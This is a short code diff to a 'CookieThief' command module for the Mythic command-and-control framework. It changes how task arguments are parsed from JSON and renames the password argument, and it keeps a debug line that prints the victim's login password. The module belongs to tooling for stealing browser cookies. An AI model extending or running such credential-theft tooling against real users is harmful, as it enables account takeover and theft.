@@ -36,7 +36,12 @@ class CookieThiefArguments(TaskArguments):
         }
 
     async def parse_arguments(self):
-        self.load_args_from_json_string(self.command_line)
+        temp_dict = json.loads(self.command_line)
+        for k, v in temp_dict.items():
+            for k2, v2 in self.args.items():
+                if v2.name == k or k2 ==k:
+                    v2.value = v
+        # self.load_args_from_json_string(self.command_line)
 
 
 class CookieThiefCommand(CommandBase):
@@ -60,7 +65,7 @@ class CookieThiefCommand(CommandBase):
         pass
 
     async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
-        k_password = task.args.get_arg("User Login Password")
+        k_password = task.args.get_arg("password")
         ##DEBUG:
         print("Password: " + str(k_password))
         sys.stdout.flush()
